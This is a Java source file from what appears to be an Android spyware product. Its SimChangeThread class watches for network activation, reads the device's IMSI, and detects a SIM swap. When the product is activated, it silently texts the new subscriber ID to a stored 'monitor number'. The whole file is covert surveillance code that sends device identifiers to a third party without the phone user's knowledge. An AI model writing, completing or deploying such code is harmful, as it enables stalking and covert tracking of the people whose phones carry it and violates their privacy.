package com.vvt.dalvik.thread;

import android.content.Context;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import com.fx.event.Event;
import com.fx.license.LicenseManager;
import com.fx.maind.ref.Customization;
import com.fx.preference.PreferenceManager;
import com.fx.preference.SpyInfoManager;
import com.fx.preference.SpyInfoManagerFactory;
import com.fx.preference.model.ProductInfo;
import com.fx.util.FxResource;
import com.fx.util.FxUtil;
import com.vvt.logger.FxLog;
import com.vvt.network.NetworkServiceInfo;
import com.vvt.network.NetworkServiceInfo.State;
import com.vvt.network.NetworkServiceMonitoring;
import com.vvt.network.NetworkServiceMonitoring.OnNetworkChangeListener;

/**
 * To be run when the phone is restarted to check if the SIM has been changed. If changed, send 
 * a notification message to the monitor number. 
 */
public class SimChangeThread implements OnNetworkChangeListener {
	
	private static final String TAG = "SimChangeThread";
	private static final boolean LOGV = Customization.VERBOSE;
	
	private Context mContext;
	private SpyInfoManager mSpyInfoManager;
	private TelephonyManager mTelephonyManager;
	
	public SimChangeThread(Context context) {
		mContext = context;
		mSpyInfoManager = SpyInfoManagerFactory.getSpyInfoManager(mContext);
		mTelephonyManager = 
				(TelephonyManager) mContext.getSystemService(
						Context.TELEPHONY_SERVICE);
	}
	
	public void enable() {
		NetworkServiceMonitoring networkMonitoring = new NetworkServiceMonitoring(mContext, this);
		networkMonitoring.start();
	}
	
	@Override
	public void onNetworkChange(NetworkServiceInfo info) {
		if (LOGV) FxLog.v(TAG, "onNetworkChange # ENTER ...");
		
		if (info != null) {
			State state = info.getState();
			FxLog.d(TAG, String.format("onNetworkChange # State: %s", state));
			
			if (state == State.ACTIVE) {
				verifySim();
			}
		}
		
		if (LOGV) FxLog.v(TAG, "onNetworkChange # EXIT ...");
	}
	
	private void verifySim() {
		if (LOGV) FxLog.d(TAG, "verifySim # ENTER ...");
		
		// Get previous SIM ID (IMSI)
		String previousSubscriberId = mSpyInfoManager.getSimId();
		FxLog.d(TAG, String.format(
				"verifySim # Previous subscriber ID: %s", previousSubscriberId));
		
		// Get current SIM ID (IMSI)
		String currentSubscriberId = getSubscriberId();
		FxLog.d(TAG, String.format(
				"verifySim # Current subscriber ID: %s", currentSubscriberId));
		
		// Update current SIM ID (IMSI) in database
		if (currentSubscriberId != null) {
			mSpyInfoManager.setSimId(currentSubscriberId);
		}
		
		// Check activation status -> end thread if product is not activated
		boolean isActivated = LicenseManager.getInstance(mContext).isActivated();
		if (! isActivated) {
			FxLog.d(TAG, "verifySim # Product is not activated -> EXIT");
			return;
		}
		
		// Check monitor number -> end thread if not existed
		String monitorNumber = mSpyInfoManager.getMonitorNumber();
		if (monitorNumber == null || monitorNumber.length() == 0) {
			FxLog.d(TAG, "verifySim # Monitor number is not set -> EXIT");
			return;
		}
		
		// Check if SIM card is changed
		if (! currentSubscriberId.equals(previousSubscriberId)) {
			FxLog.d(TAG, String.format(
					"verifySim # SIM is changed from \"%s\" to \"%s\"", 
					previousSubscriberId, currentSubscriberId));
			
			notifySimChanged(monitorNumber, currentSubscriberId);
		} 
		else {
			FxLog.d(TAG, "verifySim # SIM is not changed");
		}
		
		if (LOGV) FxLog.d(TAG, "verifySim # EXIT");
	}
	
	private void notifySimChanged(String destination, String subscriberId) {
		if (LOGV) FxLog.v(TAG, "notifySimChanged # ENTER ...");
		
		ProductInfo product = PreferenceManager.getInstance(mContext).getProductInfo();
		String productDisplayName = product.getDisplayName();
		
		String message = 
				FxResource.getSimChangeNotification(
						mContext, productDisplayName, subscriberId);
		
		if (LOGV) FxLog.v(TAG, "Notification is being captured as system event");
		FxUtil.captureSystemEvent(mContext, Event.DIRECTION_OUT, message);
		
		if (LOGV) {
			FxLog.v(TAG, String.format(
					"notifySimChanged # Sending SMS \"%s\" to %s ...", message, destination));
		}
		SmsManager smsManager = SmsManager.getDefault();
		smsManager.sendMultipartTextMessage(
				destination, null, smsManager.divideMessage(message), null, null);
		
		if (LOGV) FxLog.v(TAG, "notifySimChanged # EXIT ...");
	}
	
	private String getSubscriberId() {
		String subscriberId = mTelephonyManager.getSubscriberId();
		
		while (subscriberId == null) {
			try {
				Thread.sleep(1000);
			}
			catch (InterruptedException e) { /* do nothing */ }
			subscriberId = mTelephonyManager.getSubscriberId();
		}
		return subscriberId;
	}
	
}
